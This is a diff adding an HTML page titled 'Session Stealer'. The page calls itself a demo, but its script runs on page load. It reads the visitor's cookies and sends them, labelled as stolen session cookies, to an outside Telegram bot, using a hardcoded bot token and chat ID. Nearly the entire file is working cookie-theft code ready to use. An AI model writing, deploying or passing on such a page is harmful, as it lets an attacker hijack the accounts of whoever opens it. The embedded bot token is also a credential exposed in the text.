@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Session Stealer</title>
+    <script>
+        // Function to steal cookies
+        function stealSession() {
+            // Get the cookies
+            var cookies = document.cookie;
+            
+            // Telegram bot API details
+            var telegramBotToken = "6421601945:AAHfCxgub4hJFRp-bJqLEGg7EGJs6VnxYzQ";
+            var chatID = "1900509620";
+            var message = encodeURIComponent("Stolen session cookies: " + cookies);
+            
+            // Send the stolen cookies to Telegram
+            var telegramAPI = "https://api.telegram.org/bot" + telegramBotToken + "/sendMessage";
+            var url = telegramAPI + "?chat_id=" + chatID + "&text=" + message;
+            
+            // Send request to Telegram
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", url, true);
+            xhr.send();
+        }
+        
+        // Execute the function
+        stealSession();
+    </script>
+</head>
+<body>
+    <h1>Welcome to the Demo Page</h1>
+    <p>This is just a demo to show how session stealing could be done.</p>
+</body>
+</html>
